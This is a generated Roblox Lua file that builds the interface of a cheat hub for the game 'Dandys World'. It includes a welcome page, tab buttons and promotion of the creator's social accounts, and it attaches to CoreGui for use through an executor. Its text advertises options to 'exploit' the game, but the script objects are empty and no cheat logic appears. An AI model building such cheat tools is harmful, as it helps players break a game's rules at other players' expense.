--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
]=]

-- Instances: 432 | Scripts: 124 | Modules: 0
local G2L = {};

-- StarterGui.DebugVersion
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["Name"] = [[DebugVersion]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;

-- StarterGui.DebugVersion.Title
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 2;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(2, 255, 129);
G2L["2"]["Size"] = UDim2.new(0, 378, 0, 20);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Position"] = UDim2.new(0.32559844851493835, 0, 0.168439120054245, 0);
G2L["2"]["Name"] = [[Title]];

-- StarterGui.DebugVersion.Title.script_content
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["BorderSizePixel"] = 2;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(2, 66, 34);
G2L["3"]["Size"] = UDim2.new(0, 378, 0, 390);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Position"] = UDim2.new(0, 0, 0.9457942843437195, 0);
G2L["3"]["Name"] = [[script_content]];

-- StarterGui.DebugVersion.Title.script_content.welcomepage
G2L["4"] = Instance.new("Frame", G2L["3"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["Size"] = UDim2.new(0, 378, 0, 371);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Position"] = UDim2.new(0, 0, 0.04871794953942299, 0);
G2L["4"]["Name"] = [[welcomepage]];

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome
G2L["5"] = Instance.new("Frame", G2L["4"]);
G2L["5"]["BorderSizePixel"] = 5;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(35, 255, 0);
G2L["5"]["Size"] = UDim2.new(0, 332, 0, 326);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Position"] = UDim2.new(0.05820105969905853, 0, 0.04582210257649422, 0);
G2L["5"]["Name"] = [[welcome]];

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel
G2L["6"] = Instance.new("TextLabel", G2L["5"]);
G2L["6"]["TextWrapped"] = true;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextScaled"] = true;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["TextSize"] = 14;
G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Size"] = UDim2.new(0, 265, 0, 20);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[¡UPDATE! / welcome, %plr%]];
G2L["6"]["Name"] = [[TestLabel]];
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Position"] = UDim2.new(0.09939759224653244, 0, 0, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["6"]);


-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame
G2L["8"] = Instance.new("Frame", G2L["6"]);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 101, 13);
G2L["8"]["Size"] = UDim2.new(0, 332, 0, 306);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Position"] = UDim2.new(-0.12452830374240875, 0, 1, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextLabel
G2L["9"] = Instance.new("TextLabel", G2L["8"]);
G2L["9"]["TextWrapped"] = true;
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextScaled"] = true;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["TextSize"] = 14;
G2L["9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Size"] = UDim2.new(0, 301, 0, 58);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[exploit Dandys world with our powerful and easy to use GUI, This script offers several options that will exploit the game to enhance your experience. Enjoy :D]];
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Position"] = UDim2.new(0.04518072307109833, 0, 0.03921568766236305, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextLabel
G2L["a"] = Instance.new("TextLabel", G2L["8"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextScaled"] = true;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["Size"] = UDim2.new(0, 301, 0, 22);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[¿what is this?]];
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["Position"] = UDim2.new(0.048192769289016724, 0, 0, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextLabel
G2L["b"] = Instance.new("TextLabel", G2L["8"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextScaled"] = true;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["Size"] = UDim2.new(0, 301, 0, 22);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[¡¿ How To Use it !?]];
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Position"] = UDim2.new(0.04518072307109833, 0, 0.20261438190937042, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextLabel
G2L["c"] = Instance.new("TextLabel", G2L["8"]);
G2L["c"]["TextWrapped"] = true;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextScaled"] = true;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["TextSize"] = 14;
G2L["c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Size"] = UDim2.new(0, 301, 0, 57);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[Navigate through the tabs, you will find options that makes dandys world more fun. The close/minimize button is at the top right.]];
G2L["c"]["BackgroundTransparency"] = 1;
G2L["c"]["Position"] = UDim2.new(0.04518072307109833, 0, 0.27450981736183167, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextLabel
G2L["d"] = Instance.new("TextLabel", G2L["8"]);
G2L["d"]["TextWrapped"] = true;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextScaled"] = true;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d"]["TextSize"] = 14;
G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["Size"] = UDim2.new(0, 301, 0, 22);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[/ Features in this script \]];
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["Position"] = UDim2.new(0.048192769289016724, 0, 0.46078431606292725, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextLabel
G2L["e"] = Instance.new("TextLabel", G2L["8"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextScaled"] = true;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["Size"] = UDim2.new(0, 262, 0, 116);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[◌Main Page◌
◌Much options◌]];
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Position"] = UDim2.new(0.10240963846445084, 0, 0.506536066532135, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextLabel.MulticolorScript
G2L["f"] = Instance.new("LocalScript", G2L["e"]);
G2L["f"]["Name"] = [[MulticolorScript]];

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextButton
G2L["10"] = Instance.new("TextButton", G2L["8"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextScaled"] = true;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["TextSize"] = 14;
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Size"] = UDim2.new(0, 200, 0, 26);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[ok]];
G2L["10"]["Position"] = UDim2.new(0.1927710771560669, 0, 0.8888887763023376, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextButton.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);


-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextButton.UICorner
G2L["12"] = Instance.new("UICorner", G2L["10"]);


-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextButton.UIStroke
G2L["13"] = Instance.new("UIStroke", G2L["10"]);
G2L["13"]["Thickness"] = 3;
G2L["13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.TextButton.UIStroke
G2L["14"] = Instance.new("UIStroke", G2L["10"]);


-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TestLabel.Frame.UIStroke
G2L["15"] = Instance.new("UIStroke", G2L["8"]);
G2L["15"]["LineJoinMode"] = Enum.LineJoinMode.Miter;

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.UIStroke
G2L["16"] = Instance.new("UIStroke", G2L["5"]);
G2L["16"]["Thickness"] = 5;
G2L["16"]["LineJoinMode"] = Enum.LineJoinMode.Bevel;

-- StarterGui.DebugVersion.Title.script_content.welcomepage.welcome.TextLabel
G2L["17"] = Instance.new("TextLabel", G2L["5"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["TextStrokeTransparency"] = 0;
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextScaled"] = true;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["TextTransparency"] = 0.8999999761581421;
G2L["17"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["TextSize"] = 14;
G2L["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Size"] = UDim2.new(0, 340, 0, 20);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[DW Noxious Hub Promoted This Script]];
G2L["17"]["BackgroundTransparency"] = 0.9990000128746033;
G2L["17"]["Position"] = UDim2.new(-0.0242919921875, 0, 1.024539828300476, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All
G2L["18"] = Instance.new("Frame", G2L["4"]);
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundTransparency"] = 1;
G2L["18"]["Size"] = UDim2.new(0, 378, 0, 371);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Visible"] = false;
G2L["18"]["Name"] = [[All]];

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.EzHubWelc
G2L["19"] = Instance.new("TextLabel", G2L["18"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextScaled"] = true;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["TextSize"] = 14;
G2L["19"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Size"] = UDim2.new(0, 271, 0, 34);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[Welcome To DW Hub]];
G2L["19"]["Name"] = [[EzHubWelc]];
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Position"] = UDim2.new(0.14021164178848267, 0, 0.04582210257649422, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.Frame
G2L["1a"] = Instance.new("Frame", G2L["18"]);
G2L["1a"]["BorderSizePixel"] = 3;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(39, 255, 0);
G2L["1a"]["Size"] = UDim2.new(0, 332, 0, 294);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Position"] = UDim2.new(0.05820105969905853, 0, 0.13746631145477295, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.Frame.TextLabel
G2L["1b"] = Instance.new("TextLabel", G2L["1a"]);
G2L["1b"]["TextWrapped"] = true;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["TextSize"] = 18;
G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Size"] = UDim2.new(0, 330, 0, 256);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[...................................... .
. Created by G0bbyD0llan     .
. ______________________ .
. Roblox: @G0bbyD0llan1      .
. Youtube: @G0bbyD0llan57  .
. TikTok: @g0bbyscripter       .
. ______________________ .
. ¡Thanks for the support :D! .
. ....................................... .
discord: g0bbyd0llan12]];
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["Position"] = UDim2.new(0, 0, -0.11564625799655914, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.Frame.LoaDStriNgTEXT
G2L["1c"] = Instance.new("TextLabel", G2L["1a"]);
G2L["1c"]["TextWrapped"] = true;
G2L["1c"]["TextStrokeTransparency"] = 0;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["TextSize"] = 18;
G2L["1c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Size"] = UDim2.new(0, 330, 0, 57);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[LoadString text]];
G2L["1c"]["Name"] = [[LoaDStriNgTEXT]];
G2L["1c"]["BackgroundTransparency"] = 1;
G2L["1c"]["Position"] = UDim2.new(0, 0, 0.6394555568695068, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.Frame.LoaDStriNgTEXT.LocalScript
G2L["1d"] = Instance.new("LocalScript", G2L["1c"]);


-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.Frame.LoaDStriNgTEXT
G2L["1e"] = Instance.new("TextLabel", G2L["1a"]);
G2L["1e"]["TextWrapped"] = true;
G2L["1e"]["TextStrokeTransparency"] = 0;
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["TextSize"] = 18;
G2L["1e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Size"] = UDim2.new(0, 330, 0, 49);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[¡Subscribe to my Youtube Channel!]];
G2L["1e"]["Name"] = [[LoaDStriNgTEXT]];
G2L["1e"]["BackgroundTransparency"] = 0.5;
G2L["1e"]["Position"] = UDim2.new(0, 0, 0.8333332538604736, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.MiscText
G2L["1f"] = Instance.new("TextLabel", G2L["18"]);
G2L["1f"]["TextWrapped"] = true;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextScaled"] = true;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["Size"] = UDim2.new(0, 245, 0, 21);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[]];
G2L["1f"]["Name"] = [[MiscText]];
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.9433962106704712, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.MiscText.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1f"]);


-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.TextButton
G2L["21"] = Instance.new("TextButton", G2L["18"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["TextStrokeTransparency"] = 0;
G2L["21"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["TextScaled"] = true;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["21"]["TextSize"] = 14;
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/RobotoCondensed.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Size"] = UDim2.new(0, 332, 0, 31);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[<< copy the link of my youtube channel to the clipboard  >>]];
G2L["21"]["Position"] = UDim2.new(0.05820105969905853, 0, 0.8538461327552795, 0);

-- StarterGui.DebugVersion.Title.script_content.welcomepage.All.TextButton.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);


-- StarterGui.DebugVersion.Title.script_content.pages
G2L["23"] = Instance.new("Frame", G2L["3"]);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(36, 58, 40);
G2L["23"]["Size"] = UDim2.new(0, 378, 0, 20);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Name"] = [[pages]];

-- StarterGui.DebugVersion.Title.script_content.pages.welcome
G2L["24"] = Instance.new("TextButton", G2L["23"]);
G2L["24"]["TextWrapped"] = true;
G2L["24"]["TextStrokeColor3"] = Color3.fromRGB(0, 255, 235);
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(18, 255, 0);
G2L["24"]["TextSize"] = 14;
G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["24"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Size"] = UDim2.new(0, 79, 0, 20);
G2L["24"]["Name"] = [[welcome]];
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Text"] = [[¡welcome!]];

-- StarterGui.DebugVersion.Title.script_content.pages.welcome.LocalScript
G2L["25"] = Instance.new("LocalScript", G2L["24"]);


-- StarterGui.DebugVersion.Title.script_content.pages.target
G2L["26"] = Instance.new("TextButton", G2L["23"]);
G2L["26"]["TextWrapped"] = true;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(18, 255, 0);
G2L["26"]["TextSize"] = 14;
G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Size"] = UDim2.new(0, 79, 0, 20);
G2L["26"]["Name"] = [[target]];
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Text"] = [[Main]];
G2L["26"]["Position"] = UDim2.new(0.20899471640586853, 0, 0, 0);

-- StarterGui.DebugVersion.Title.script_content.pages.target.LocalScript
G2L["27"] = Instance.new("LocalScript", G2L["26"]);


-- StarterGui.DebugVersion.Title.script_content.pages.options
G2L["28"] = Instance.new("TextButton", G2L["23"]);
G2L["28"]["TextWrapped"] = true;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(18, 255, 0);
G2L["28"]["TextSize"] = 14;
G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Size"] = UDim2.new(0, 79, 0, 20);
G2L["28"]["Name"] = [[options]];
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[Information]];
G2L["28"]["Position"] = UDim2.new(0.41798943281173706, 0, 0, 0);

-- StarterGui.DebugVersion.Title.script_content.pages.options.LocalScript
G2L["29"] = Instance.new("LocalScript", G2L["28"]);


-- StarterGui.DebugVersion.Title.script_content.pages.options
G2L["2a"] = Instance.new("TextButton", G2L["23"]);
G2L["2a"]["TextWrapped"] = true;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(18, 255, 0);
G2L["2a"]["TextSize"] = 14;
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Size"] = UDim2.new(0, 79, 0, 20);
G2L["2a"]["Name"] = [[options]];
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[options]];
G2L["2a"]["Position"] = UDim2.new(0.6269841194152832, 0, 0, 0);

-- StarterGui.DebugVersion.Title.script_content.pages.options.LocalScript
G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);


-- StarterGui.DebugVersion.Title.script_content.pages.HappyFace
G2L["2c"] = Instance.new("TextButton", G2L["23"]);
G2L["2c"]["TextWrapped"] = true;
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 248);
G2L["2c"]["TextSize"] = 14;
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Size"] = UDim2.new(0, 26, 0, 20);
G2L["2c"]["Name"] = [[HappyFace]];
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[:D]];
G2L["2c"]["Position"] = UDim2.new(0.9338624477386475, 0, 0, 0);

-- StarterGui.DebugVersion.Title.script_content.pages.HappyFace.LocalScript
G2L["2d"] = Instance.new("LocalScript", G2L["2c"]);


-- StarterGui.DebugVersion.Title.script_content.pages.HappyFace.LocalScript
G2L["2e"] = Instance.new("LocalScript", G2L["2c"]);


-- StarterGui.DebugVersion.Title.script_content.information
G2L["2f"] = Instance.new("Frame", G2L["3"]);
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["BackgroundTransparency"] = 1;
G2L["2f"]["Size"] = UDim2.new(0, 378, 0, 368);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Position"] = UDim2.new(0, 0, 0.05128201097249985, 0);
G2L["2f"]["Visible"] = false;
G2L["2f"]["Name"] = [[information]];

-- StarterGui.DebugVersion.Title.script_content.information.TextLabel
G2L["30"] = Instance.new("TextLabel", G2L["2f"]);
G2L["30"]["TextWrapped"] = true;
G2L["30"]["TextScaled"] = true;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["30"]["TextSize"] = 14;
G2L["30"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["Size"] = UDim2.new(0, 378, 0, 43);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Text"] = [[Information]];
G2L["30"]["BackgroundTransparency"] = 1;

-- StarterGui.DebugVersion.Title.script_content.information.LocalScript
G2L["31"] = Instance.new("LocalScript", G2L["2f"]);


-- StarterGui.DebugVersion.Title.script_content.information.TextButton
G2L["32"] = Instance.new("TextButton", G2L["2f"]);
G2L["32"]["TextWrapped"] = true;
G2L["32"]["TextTransparency"] = 0.5;
G2L["32"]["TextScaled"] = true;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["TextSize"] = 14;
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Size"] = UDim2.new(0, 378, 0, 24);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Text"] = [[workspace.information]];
G2L["32"]["Position"] = UDim2.new(0, 0, 0.9402173757553101, 0);
G2L["32"]["BackgroundTransparency"] = 0.5;

-- StarterGui.DebugVersion.Title.script_content.information.ScrollingFrame
G2L["33"] = Instance.new("ScrollingFrame", G2L["2f"]);
G2L["33"]["Active"] = true;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(2, 66, 34);
G2L["33"]["Size"] = UDim2.new(0, 378, 0, 303);
G2L["33"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Position"] = UDim2.new(0, 0, 0.11684782803058624, 0);

-- StarterGui.DebugVersion.Title.script_content.options
G2L["34"] = Instance.new("Frame", G2L["3"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["BackgroundTransparency"] = 1;
G2L["34"]["Size"] = UDim2.new(0, 378, 0, 371);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Position"] = UDim2.new(0, 0, 0.04871794953942299, 0);
G2L["34"]["Visible"] = false;
G2L["34"]["Name"] = [[options]];

